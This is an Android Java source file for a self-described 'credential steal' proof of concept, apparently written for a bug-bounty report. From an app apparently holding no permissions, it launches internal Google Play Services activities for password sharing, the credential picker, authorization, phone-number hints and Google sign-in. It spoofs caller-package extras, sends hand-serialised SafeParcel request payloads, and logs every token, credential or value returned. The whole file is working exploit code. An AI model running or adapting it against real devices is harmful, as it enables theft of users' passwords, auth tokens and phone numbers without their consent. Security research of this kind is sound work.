package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcel;
import android.util.Log;
import com.google.android.gms.auth.api.identity.GetPhoneNumberHintIntentRequest;

public class CredentialStealActivity extends Activity {
    private static final String T = "CREDSTEAL";
    private static final int RC_SHARE_PASSWORDS = 1001;
    private static final int RC_CREDENTIAL_PICKER = 1002;
    private static final int RC_AUTHORIZATION = 1003;
    private static final int RC_PHONE_HINT = 1004;
    private static final int RC_GOOGLE_SIGNIN = 1005;
    private static final int RC_SAVE_CRED = 1006;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.w(T, "=== CREDENTIAL STEAL PoC ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " pkg=" + getPackageName());

        String target = getIntent().getStringExtra("target");
        if (target == null) target = "share";

        switch (target) {
            case "share":
                testSharePasswords();
                break;
            case "picker":
                testCredentialPicker();
                break;
            case "auth":
                testAuthorization();
                break;
            case "phone":
                testPhoneHint();
                break;
            case "signin":
                testGoogleSignIn();
                break;
            case "save":
                testSaveCredential();
                break;
            case "all":
                testSharePasswords();
                break;
        }
    }

    private void testSharePasswords() {
        Log.w(T, "--- Testing SharePasswordsActivity ---");
        try {
            Intent intent = new Intent("com.google.android.gms.auth.api.credentials.SHARE_PASSWORDS_WITH_AI_AGENT");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.sharepasswordwithaiagent.ui.SharePasswordsActivity"));
            intent.putExtra("com.google.android.gms.credentials.CallingPackage", getPackageName());
            intent.putExtra("callingPackage", getPackageName());
            intent.putExtra("com.google.android.gms.auth.api.credentials.extra.CALLER_PACKAGE", getPackageName());
            startActivityForResult(intent, RC_SHARE_PASSWORDS);
        } catch (Exception e) {
            Log.e(T, "SharePasswords launch failed: " + e.getMessage());
            testCredentialPicker();
        }
    }

    private void testCredentialPicker() {
        Log.w(T, "--- Testing CredentialPickerActivity ---");
        try {
            Intent intent = new Intent("com.google.android.gms.auth.api.credentials.PICKER");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.ui.CredentialPickerActivity"));
            intent.putExtra("com.google.android.gms.credentials.CredentialPickerConfig",
                new Bundle());
            Bundle requestBundle = new Bundle();
            requestBundle.putBoolean("passwordLoginSupported", true);
            requestBundle.putBoolean("supportsPasswordLogin", true);
            requestBundle.putInt("credentialPickerUiType", 1);
            intent.putExtra("com.google.android.gms.credentials.CredentialRequest", requestBundle);
            intent.putExtra("com.google.android.gms.auth.api.credentials.extra.CALLER_PACKAGE", getPackageName());
            startActivityForResult(intent, RC_CREDENTIAL_PICKER);
        } catch (Exception e) {
            Log.e(T, "CredentialPicker launch failed: " + e.getMessage());
            testAuthorization();
        }
    }

    private void testAuthorization() {
        Log.w(T, "--- Testing AuthorizationActivity ---");
        try {
            Intent intent = new Intent("com.google.android.gms.auth.api.credentials.AUTHORIZATION");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.authorization.ui.AuthorizationActivity"));
            Bundle authBundle = new Bundle();
            authBundle.putString("scopes", "email profile openid");
            authBundle.putBoolean("requestAuthorizationCode", true);
            authBundle.putBoolean("requestIdToken", true);
            authBundle.putBoolean("requestServerAuthCode", true);
            intent.putExtra("com.google.android.gms.auth.api.credentials.AuthorizationRequest", authBundle);
            intent.putExtra("com.google.android.gms.auth.api.credentials.extra.CALLER_PACKAGE", getPackageName());
            startActivityForResult(intent, RC_AUTHORIZATION);
        } catch (Exception e) {
            Log.e(T, "Authorization launch failed: " + e.getMessage());
            testPhoneHint();
        }
    }

    private byte[] buildSafeParcelInt(int fieldId, int value) {
        Parcel p = Parcel.obtain();
        // SafeParcel begin marker: (0xFFFF << 16) | version(20293=0x4F45)
        p.writeInt(0xFFFF4F45);
        // Total data size: 8 bytes (field header + int value)
        p.writeInt(8);
        // Field header: (dataSize << 16) | fieldId
        p.writeInt((4 << 16) | fieldId);
        // Field value
        p.writeInt(value);
        byte[] bytes = p.marshall();
        p.recycle();
        return bytes;
    }

    private void testPhoneHint() {
        Log.w(T, "--- Testing PhoneNumberHintActivity ---");
        try {
            Intent intent = new Intent("com.google.android.gms.auth.api.credentials.PHONE_NUMBER_HINT");
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.assistedsignin.ui.PhoneNumberHintActivity"));
            // bowh.b() reads byte[] not Parcelable! Serialize SafeParcel manually.
            byte[] requestBytes = buildSafeParcelInt(1, 0);
            intent.putExtra("get_phone_number_hint_intent_request", requestBytes);
            intent.putExtra("session_id", "vuln_test_session");
            Log.w(T, "Request bytes length=" + requestBytes.length);
            startActivityForResult(intent, RC_PHONE_HINT);
        } catch (Exception e) {
            Log.e(T, "PhoneHint launch failed: " + e.getMessage());
        }
    }

    private byte[] buildSafeParcelString(int fieldId, String value) {
        // Build a SafeParcel with a single string field
        Parcel p = Parcel.obtain();
        // Begin marker
        p.writeInt(0xFFFF4F45);
        int sizePos = p.dataPosition();
        p.writeInt(0); // placeholder for total data size

        // String field: header with 0xFFFF means size follows
        p.writeInt((0xFFFF << 16) | fieldId);
        int strSizePos = p.dataPosition();
        p.writeInt(0); // placeholder for string data byte count
        p.writeString(value);
        int afterStr = p.dataPosition();
        // Fill in string data byte count
        p.setDataPosition(strSizePos);
        p.writeInt(afterStr - strSizePos - 4);
        p.setDataPosition(afterStr);

        // Fill in total data size
        int endPos = p.dataPosition();
        p.setDataPosition(sizePos);
        p.writeInt(endPos - sizePos - 4);
        p.setDataPosition(endPos);

        byte[] bytes = p.marshall();
        p.recycle();
        return bytes;
    }

    private void writeStringField(Parcel p, int fieldId, String value) {
        Parcel tmp = Parcel.obtain();
        tmp.writeString(value);
        int strBytes = tmp.dataPosition();
        tmp.recycle();
        if (strBytes < 0xFFFF) {
            p.writeInt((strBytes << 16) | fieldId);
        } else {
            p.writeInt((0xFFFF << 16) | fieldId);
            p.writeInt(strBytes);
        }
        p.writeString(value);
    }

    private byte[] buildSignInRequest(String serverClientId) {
        Parcel p = Parcel.obtain();
        p.writeInt(0xFFFF4F45);
        int sizePos = p.dataPosition();
        p.writeInt(0);

        // Field 1: serverClientId (required by bovq.q in constructor)
        writeStringField(p, 1, serverClientId);
        // Field 3: nonce (required non-null by apkv→bovq.q in altw line 284)
        writeStringField(p, 3, "vrp_nonce_" + System.currentTimeMillis());

        int endPos = p.dataPosition();
        p.setDataPosition(sizePos);
        p.writeInt(endPos - sizePos - 4);
        p.setDataPosition(endPos);

        byte[] bytes = p.marshall();
        Log.w(T, "SafeParcel total length: " + bytes.length);
        p.recycle();
        return bytes;
    }

    private void testGoogleSignIn() {
        Log.w(T, "--- Testing GoogleSignInActivity ---");
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.assistedsignin.ui.GoogleSignInActivity"));
            byte[] requestBytes = buildSignInRequest("fake-server-client-id.apps.googleusercontent.com");
            intent.putExtra("get_sign_in_intent_request", requestBytes);
            Log.w(T, "SignIn request bytes length=" + requestBytes.length);
            startActivityForResult(intent, RC_GOOGLE_SIGNIN);
        } catch (Exception e) {
            Log.e(T, "GoogleSignIn launch failed: " + e.getMessage());
        }
    }

    private void testSaveCredential() {
        Log.w(T, "--- Testing CredentialsSaveConfirmationActivity ---");
        try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName("com.google.android.gms",
                "com.google.android.gms.auth.api.credentials.ui.CredentialsSaveConfirmationActivity"));
            intent.putExtra("com.google.android.gms.auth.api.credentials.extra.CALLER_PACKAGE", getPackageName());
            startActivityForResult(intent, RC_SAVE_CRED);
        } catch (Exception e) {
            Log.e(T, "SaveCredential launch failed: " + e.getMessage());
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        String target = "UNKNOWN";
        switch (requestCode) {
            case RC_SHARE_PASSWORDS: target = "SharePasswords"; break;
            case RC_CREDENTIAL_PICKER: target = "CredentialPicker"; break;
            case RC_AUTHORIZATION: target = "Authorization"; break;
            case RC_PHONE_HINT: target = "PhoneHint"; break;
            case RC_GOOGLE_SIGNIN: target = "GoogleSignIn"; break;
            case RC_SAVE_CRED: target = "SaveCredential"; break;
        }

        Log.w(T, "=== RESULT FROM " + target + " ===");
        Log.w(T, "resultCode=" + resultCode + " (OK=" + RESULT_OK + " CANCEL=" + RESULT_CANCELED + ")");

        if (data != null) {
            Log.w(T, "*** DATA RETURNED ***");
            Log.w(T, "action=" + data.getAction());
            Log.w(T, "data=" + data.getData());
            Log.w(T, "type=" + data.getType());
            Log.w(T, "flags=" + data.getFlags());
            Log.w(T, "component=" + data.getComponent());

            Bundle extras = data.getExtras();
            if (extras != null) {
                Log.w(T, "*** EXTRAS (count=" + extras.size() + ") ***");
                for (String key : extras.keySet()) {
                    Object val = extras.get(key);
                    if (val != null) {
                        String valStr = val.toString();
                        Log.w(T, "  KEY: " + key);
                        Log.w(T, "  TYPE: " + val.getClass().getName());
                        Log.w(T, "  VALUE: " + valStr.substring(0, Math.min(500, valStr.length())));
                        if (val instanceof byte[]) {
                            byte[] bytes = (byte[]) val;
                            Log.w(T, "  LEN: " + bytes.length);
                            // Parse SafeParcelable Status: magic(4) + totalsize(4) + field1_hdr(4) + statusCode(4) + field2_hdr(4) + strSize(4) + charCount(4) + string
                            try {
                                Parcel p = Parcel.obtain();
                                p.unmarshall(bytes, 0, bytes.length);
                                p.setDataPosition(0);
                                int magic = p.readInt();
                                int totalSize = p.readInt();
                                int f1hdr = p.readInt();
                                int statusCode = p.readInt();
                                int f2hdr = p.readInt();
                                int strSize = p.readInt();
                                int charCount = p.readInt();
                                byte[] strBytes = new byte[charCount * 2];
                                p.readByteArray(strBytes);
                                String msg = new String(strBytes, "UTF-16LE");
                                Log.w(T, "  STATUS_CODE: " + statusCode);
                                Log.w(T, "  STATUS_MSG: " + msg);
                                p.recycle();
                            } catch (Exception pe) {
                                // Fallback: dump raw bytes as ASCII
                                StringBuilder ascii = new StringBuilder();
                                for (byte b : bytes) {
                                    if (b >= 32 && b < 127) ascii.append((char) b);
                                }
                                Log.w(T, "  RAW_ASCII: " + ascii.toString());
                                Log.w(T, "  PARCEL_ERR: " + pe.getMessage());
                            }
                        }
                        if (val instanceof Bundle) {
                            Bundle sub = (Bundle) val;
                            for (String subKey : sub.keySet()) {
                                Object subVal = sub.get(subKey);
                                Log.w(T, "    SUB: " + subKey + "=" + (subVal != null ?
                                    subVal.toString().substring(0, Math.min(200, subVal.toString().length())) : "null"));
                            }
                        }
                    }
                }
            } else {
                Log.w(T, "No extras in result");
            }
        } else {
            Log.w(T, "No data returned (null intent)");
        }

        // Chain to next test
        switch (requestCode) {
            case RC_SHARE_PASSWORDS:
                testCredentialPicker();
                break;
            case RC_CREDENTIAL_PICKER:
                testAuthorization();
                break;
            case RC_AUTHORIZATION:
                testPhoneHint();
                break;
            case RC_PHONE_HINT:
                testGoogleSignIn();
                break;
            case RC_GOOGLE_SIGNIN:
                Log.w(T, "=== ALL CREDENTIAL TESTS COMPLETE ===");
                break;
        }
    }
}
